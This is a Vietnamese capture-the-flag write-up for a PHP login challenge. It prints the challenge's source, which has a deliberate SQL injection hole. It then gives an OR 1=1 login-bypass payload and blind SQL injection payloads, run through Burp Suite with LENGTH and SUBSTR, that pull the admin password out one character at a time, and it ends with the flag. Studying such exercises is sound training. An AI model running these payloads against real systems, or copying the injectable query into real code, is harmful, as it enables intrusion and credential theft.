## Bài 1:
* Đầu tiên khi mở bài lên ,chúng ta thấy 1 form đăng nhập
* Thử nhập ID bằng SQLi Injection với payload là ID=""' OR 1=1 --
* Ta thu về được : 

``` html
 Congratulations!
It's too easy?
Don't worry.
The flag is admin's password.

Hint:

<?php
    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
    
    $id = isset($_POST['id']) ? $_POST['id'] : '';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
    $login = false;
    $err = '';
    
    if ($id!=='')
    {
        $db = new PDO('sqlite:database.db');
        $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
        $login = $r && $r->fetch();
        if (!$login)
            $err = 'Login Failed';
    }
?><!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
  </head>
  <body>
    <?php if (!$login) { ?>
    <p>
      First, login as "admin".
    </p>
    <div style="font-weight:bold; color:red">
      <?php echo h($err); ?>
    </div>
    <form method="POST">
      <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
      <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
      <div><input type="submit"></div>
    </form>
    <?php } else { ?>
    <p>
      Congratulations!<br>
      It's too easy?<br>
      Don't worry.<br>
      The flag is admin's password.<br>
      <br>
      Hint:<br>
    </p>
    <pre><?php echo h(file_get_contents('index.php')); ?></pre>
    <?php } ?>
  </body>
</html>
```
* Theo như đoạn code , ta thấy flag là mật khẩu của ID=admin
* Trước tiên,sử dụng burpsuite để check độ dài của password với payload id=' OR LENGTH(pass)=§§;--&pass=
* Ta thu được độ dài mật khẩu bao gồm 21 kí tự 
* Sau khi thu được độ dài mật khẩu , ta sử dụng payload :
- id=admin' and SUBSTR((SELECT pass FROM user WHERE id='admin'),§§,1)='§§';--&pass=
* Payload set 1 cho chạy từ 1 đến 21 ứng với từng vị trí trong mật khẩu 
* Payload set 2 sử dụng brute force cho chạy từ a-z0-9 để lấy được giá trị mật khẩu ở từng vị trí
* Sau khi chạy xong , ta sắp xếp mật khẩu và thu được flag : flag_kpwa4ji3uzk6trpk
* Nhưng khi submit thì ko được , điều này tức là do trong pass có cả kí tự viết hoa 
* Chạy lại burt suite nhưng thay payload 2 thành từ a-z0-9A-Z và ta thu được flag :
-  FLAG_KpWa4ji3uZk6TrPK 

